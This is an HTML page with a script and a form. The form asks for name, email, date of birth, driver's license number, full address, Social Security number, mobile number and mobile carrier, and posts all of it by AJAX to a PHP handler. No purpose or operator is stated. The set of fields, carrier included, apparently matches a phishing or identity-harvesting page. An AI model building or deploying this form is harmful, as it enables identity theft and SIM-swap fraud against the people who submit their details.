<script>
function _(id){ return document.getElementById(id); }
function submitForm(){
	_("mybtn").disabled = true;
	_("status").innerHTML = 'please wait ...';
	var formdata = new FormData();
	formdata.append( "n", _("n").value );
	formdata.append( "e", _("e").value );
	formdata.append( "d", _("d").value );
	formdata.append( "dl", _("dl").value );
	formdata.append( "sa", _("sa").value );
	formdata.append( "c", _("c").value );
	formdata.append( "st", _("st").value );
	formdata.append( "z", _("z").value );
	formdata.append( "ss", _("ss").value );
	formdata.append( "m", _("m").value );
	formdata.append( "mc", _("mc").value );
	
	
	
	var ajax = new XMLHttpRequest();
	ajax.open( "POST", "example_parser_r.php" );
	ajax.onreadystatechange = function() {
		if(ajax.readyState == 4 && ajax.status == 200) {
			if(ajax.responseText == "success"){
				_("my_form").innerHTML = '<h2>Thanks, your message has been sent.</h2>';
			} else {
				_("status").innerHTML = ajax.responseText;
				_("mybtn").disabled = false;
			}
		}
	}
	ajax.send( formdata );
}
</script>
  

  

    

  





      
        

    
    
    
       


</br>
<form id="my_form" onsubmit="submitForm(); return false;">
  <p><input id="n" placeholder="Full Name" required></p>
  <p><input id="e" placeholder="Email Address" type="email" required></p>
  <p><input id="d" placeholder="Date of Birth" required></p>
  <p><input id="dl" placeholder="Driver's License Number" required></p>
  <p><input id="sa" placeholder="Street Address" required></p>
  <p><input id="c" placeholder="City" required></p>
  <p><input id="st" placeholder="State" required></p>
  <p><input id="z" placeholder="Zip Code" required></p>
  <p><input id="ss" placeholder="Social Security Number" required></p>
  <p><input id="m" placeholder="Mobile Number" required></p>
  <p><input id="mc" placeholder="Mobile Carrier" required></p>
  
  <p><input id="mybtn" type="submit" value="Submit Form"> <span id="status"></span></p>
</form>

    
    </br>